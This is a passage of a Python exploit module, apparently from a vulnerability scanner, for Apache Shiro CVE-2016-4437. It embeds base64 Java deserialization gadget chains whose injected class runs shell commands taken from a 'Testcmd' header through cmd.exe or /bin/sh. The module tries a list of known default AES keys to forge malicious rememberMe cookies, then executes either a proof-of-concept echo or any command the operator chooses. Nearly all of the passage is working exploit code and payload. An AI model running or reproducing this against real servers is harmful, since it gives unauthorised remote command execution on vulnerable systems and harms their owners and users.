            "lYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF"
            "2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB"
            "+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHN"
            "pemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCAC"
            "TAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEh"
            "lYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZ"
            "hL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CAC"
            "uAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmc"
            "vUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1B"
            "yb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3R"
            "yZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACc"
            "oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwE"
            "ABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgD"
            "dAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAEBjb20"
            "vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAA"
            "AAAMACgAHAAgAAgA8AAAA3AAIAAUAAACxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlk"
            "DtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0"
            "EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAAQ"
            "HAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2nABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy"
            "7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEwAWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQA"
            "AAAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAzYGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwI"
            "JGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHuGQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7g"
            "AbcAAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUrA70ABLYALE0rtgAwEpYEvQAMWQMSXFO"
            "2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJkABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLY"
            "AMBKgBb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEqJTtgAswABcTi0"
            "BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxK"
            "xU1kEErNTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsSzbYA0bYA1LYA2LgA2gQ2BC0BpQA"
            "KLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQAGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn"
            "/ABoABwcAAgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABAAHAFwBBwBvAQcAYQAAUwcAPwT"
            "/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVE"
            "HAOUpCwQCDAf/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6AAUAPQAAAAQAAQA/AAEABQA"
            "AAAIABnB0AANhYmNzcgAUamF2YS51dGlsLlByb3BlcnRpZXM5EtB6cDY+mAIAAUwACGRlZmF1bHRzcQB+AAt4cgATamF2YS51dGlsLkh"
            "hc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c3IAKm9yZy5"
            "hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1"
            "vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9"
            "rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4AClsAC2l"
            "QYXJhbVR5cGVzcQB+AAl4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJ"
            "bTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg=")
        self.CommonsCollectionsK2 = ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9"
            "sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ"
            "5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9"
            "yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAhJAA1faW5kZW50TnVtYmVySQA"
            "OX3RyYW5zbGV0SW5kZXhaABVfdXNlU2VydmljZXNNZWNoYW5pc21MAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaGUveGF"
            "sYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5"
            "nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnR"
            "pZXM7eHAAAAAB/////wFwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9"
            "vMUlwV2dPa2N3BwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb28xSXBXZ09rY3cuamF2YQEACXdyaXRlQm9"
            "keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9"
            "sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV"
            "3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0l"
            "udGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGF"
            "uZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABCh"
            "JKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF"
            "2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOww"
            "ALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24"
            "HADYBABNqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGl"
            "vbgcAPgEADVN0YWNrTWFwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGF"
            "uZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOww"
            "AQwBECgAMAEUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF"
            "2YS9sYW5nL1N0cmluZzspVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXN"
            "zaWJsZQEABChaKVYMAFEAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q"
            "7KUxqYXZhL2xhbmcvT2JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGF"
            "uZy9UaHJlYWQHAGABAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXA"
            "BABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGh"
            "yZWFkOwcAbgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGp"
            "hdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQc"
            "AfgEABnRoaXMkMAgAgAEAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAAR"
            "zaXplAQADKClJDACKAIsLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQg"
            "AkwEACWdldEhlYWRlcggAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGR"
            "IZWFkZXIIAJ8BAAdUZXN0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF"
            "2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwg"
            "ArgEAB2NtZC5leGUIALABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5"
            "nL1Byb2Nlc3NCdWlsZGVyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9"
            "Qcm9jZXNzOwwAvwDACgC7AMEBABFqYXZhL2xhbmcvUHJvY2VzcwcAwwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN"
            "0cmVhbTsMAMUAxgoAxADHAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAjAMkKALkAygEAAlxBCADMAQAMdXNlRGVsaW1pdGVyAQA"
            "nKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADOAM8KALkA0AEABG5leHQMANIAcQoAuQDTAQAIZ2V0Qnl0ZXM"
            "BAAQoKVtCDADVANYKAFwA1wwABwAICgACANkBAA1nZXRQcm9wZXJ0aWVzAQAYKClMamF2YS91dGlsL1Byb3BlcnRpZXM7DADbANwKAKY"
            "A3QEAE2phdmEvdXRpbC9IYXNodGFibGUHAN8BAAh0b1N0cmluZwwA4QBxCgDgAOIBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDkAQBAY29"
            "tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA5goA5wBeACEAAgDnAAA"
            "AAAADAAoABwAIAAIAPAAAANwACAAFAAAAsRIKuAAQTi22ABRNLRIWBr0ADFkDEhhTWQSyAB5TWQWyAB5TtgAiLAa9AARZAytTWQS7ABp"
            "ZA7cAJlNZBbsAGlkrvrcAJlO2ACxXKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwBIOgQSObgAEE4tEjsEvQAMWQMSGFO2ACI"
            "tBL0ABFkDK1O2ACxNKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwADsQABAAAAaABrADcAAQBAAAAAEQAC9wBrBwA3/QBEBwA"
            "EBwAMAD0AAAAEAAEAPwAKAEEAQgACADwAAAB+AAMABQAAAD8BTSq2ADBOpwAZLSu2AEZNpwAWpwAAOgQttgBLTqcAAy0SBKb/5ywBpgA"
            "MuwBIWSu3AE6/LAS2AFQsKrYAWrAAAQAKABMAFgBIAAEAQAAAACUABv0ACgcAVgcADAj/AAIABAcABAcAXAcAVgcADAABBwBICQUNAD0"
            "AAAAEAAEAPwABACMAXQACADwAAAM2AAgADQAAAj8qtwDoAzYEuABltgBpEmu4AG3AAG86BQM2BhUGGQW+ogIfGQUVBjI6BxkHAaYABqc"
            "CCRkHtgBzTi0SdbYAeZoADC0Se7YAeZoABqcB7hkHEn24AG1MK8EAf5oABqcB3CsSgbgAbRKDuABtEoW4AG1MpwALOginAcOnAAArEoe"
            "4AG3AAIk6CQM2ChUKGQm5AI0BAKIBnhkJFQq5AJACADoLGQsSkrgAbUwrtgAwEpQDvQAMtgA1KwO9AAS2ACxNK7YAMBKWBL0ADFkDElx"
            "TtgA1KwS9AARZAxKYU7YALMAAXE4tAaUACi22AJyZAAanAFgstgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy"
            "2ADASoAW9AAxZAxJcU1kEElxTtgA1LAW9AARZAxKYU1kELVO2ACxXBDYEK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKiU7YALMAAXE4"
            "tAaUACi22AJyZAAanAI0stgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKkuACqtgCtEq+2AHmZABgGvQBcWQM"
            "SsVNZBBKzU1kFLVOnABUGvQBcWQMStVNZBBK3U1kFLVM6DCy7ALlZuwC7WRkMtwC+tgDCtgDItwDLEs22ANG2ANS2ANi4ANoENgQtAaU"
            "ACi22AJyZAAgVBJoABqcAECy4AN62AOO2ANi4ANoVBJkABqcACYQKAaf+XBUEmQAGpwAJhAYBp/3fsQABAF8AcABzAD8AAQBAAAAA3QA"
            "Z/wAaAAcHAAIAAAABBwBvAQAA/AAXBwBh/wAXAAgHAAIAAAcAXAEHAG8BBwBhAAAC/wARAAgHAAIHAAQABwBcAQcAbwEHAGEAAFMHAD8"
            "E/wACAAgHAAIHAAQABwBcAQcAbwEHAGEAAP4ADQAHAIkB/wBjAAwHAAIHAAQHAAQHAFwBBwBvAQcAYQAHAIkBBwAEAAAC+wBULgL7AE1"
            "RBwDlKQsEAgwH/wAFAAsHAAIHAAQABwBcAQcAbwEHAGEABwCJAQAA/wAHAAgHAAIAAAABBwBvAQcAYQAA+gAFAD0AAAAEAAEAPwABAAU"
            "AAAACAAZwdAADYWJjc3IAFGphdmEudXRpbC5Qcm9wZXJ0aWVzORLQenA2PpgCAAFMAAhkZWZhdWx0c3EAfgALeHIAE2phdmEudXRpbC5"
            "IYXNodGFibGUTuw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAHhwdwEAeHNyACtvcmc"
            "uYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0Lm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAtTG9yZy9hcGFjaGUvY29"
            "tbW9ucy9jb2xsZWN0aW9uczQvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5"
            "JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAp"
            "bAAtpUGFyYW1UeXBlc3EAfgAJeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ"
            "1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAAXR4")
        
    #检测是否存在漏洞
    def cve_2016_4437(self):
        self.pocname = "Apache Shiro: CVE-2016-4437"
        self.corename = "null"
        self.rawdata = None
        self.info = "null"
        self.method = "get"
        self.base64_cmd = base64.b64encode(str.encode(self.CMD))
        self.cmd = self.base64_cmd.decode('ascii')
        self.r = "PoCWating"
        self.headers = {
            'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Testcmd': self.CMD#通过发送头部字段实现命令执行回显
        }
        self.key_lists = ['kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'Z3VucwAAAAAAAAAAAAAAAA==', 'fCq+/xW488hMTCD+cmJ3aQ==', '0AvVhmFLUs0KTA3Kprsdag==', '1AvVhdsgUs0FSA3SDFAdag==', '1QWLxg+NYmxraMoxAXu/Iw==']
        self.gadget_lists = [self.CommonsBeanutils1, self.CommonsCollectionsK1, self.CommonsCollectionsK2]
        try:
            if CodeTest.VULN == None:
                for self.key in self.key_lists:
                    for self.gadget in self.gadget_lists:
                        BS = AES.block_size
                        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                        mode =  AES.MODE_CBC
                        iv = uuid.uuid4().bytes
                        encryptor = AES.new(base64.b64decode(self.key), mode, iv)
                        file_body = pad(base64.b64decode(self.gadget))
                        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
                        self.request = requests.get(self.url, headers=self.headers, 
                                                    cookies={'rememberMe':base64_ciphertext}, 
                                                    timeout=TIMEOUT, verify=False)
                        self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                        if "rO0ABXNyABdqYXZhLnV0aWwuUHJpb" in self.gadget:
                            self.Gadget = "CommonsBeanutils1"
                        elif "AAAADHcIAAAAEAAAAAB4eHQAAXR4" in self.gadget:
                            self.Gadget = "CommonsCollectionsK2"
                        else:
                            self.Gadget = "CommonsCollectionsK1"
                        if r"VuLnEcHoPoCSuCCeSS" in self.request.text:
                            self.r = "PoCSuCCeSS"
                            self.info = CodeTest.Colored_.rce() + " [key:" + self.key + "] [gadget:" + self.Gadget + "]"
                            #if '\r\n<!DOCTYPE' in self.request.text:
                            #    searchobj = re.search(r'(.*)\r\n<!DOCTYPE(.*)', self.request.text) #返回第一个匹配对象
                            #    text = searchobj.group(1)
                            #    CodeTest.verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
                            #else:
                            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
                            break
                if self.r != "PoCSuCCeSS":
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.key = SHIRO_KEY
                self.gadget = SHIRO_GADGET
                if self.gadget == "CommonsBeanutils1":
                    self.gadget_payload = self.CommonsBeanutils1
                if self.gadget == "CommonsCollectionsK1":
                    self.gadget_payload = self.CommonsCollectionsK1
                if self.gadget == "CommonsCollectionsK2":
                    self.gadget_payload = self.CommonsCollectionsK2
                BS = AES.block_size
                pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                mode =  AES.MODE_CBC
                iv = uuid.uuid4().bytes
                encryptor = AES.new(base64.b64decode(self.key), mode, iv)
                file_body = pad(base64.b64decode(self.gadget_payload))
                base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
                self.request = requests.get(self.url, headers=self.headers, cookies={'rememberMe':base64_ciphertext}, 
                                            timeout=TIMEOUT, verify=False)
                #if '\r\n<!DOCTYPE' in self.request.text:
                #    searchobj = re.search(r'(.*)\r\n<!DOCTYPE(.*)', self.request.text) #返回第一个匹配对象
                #    text = searchobj.group(1)
                #    CodeTest.verify.generic_output(text, self.pocname, self.method, self.rawdata, self.info)
                #else:
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
print("""
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache Shiro      | cve_2016_4437    |  Y  |  Y  | <= 1.2.4, shiro-550, rememberme deserialization rce         |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpApacheShiro = ApacheShiro(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpApacheShiro = ApacheShiro(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] == "cve_2016_4437":
        ExpApacheShiro.cve_2016_4437()
    else:
        ExpApacheShiro.cve_2016_4437()












































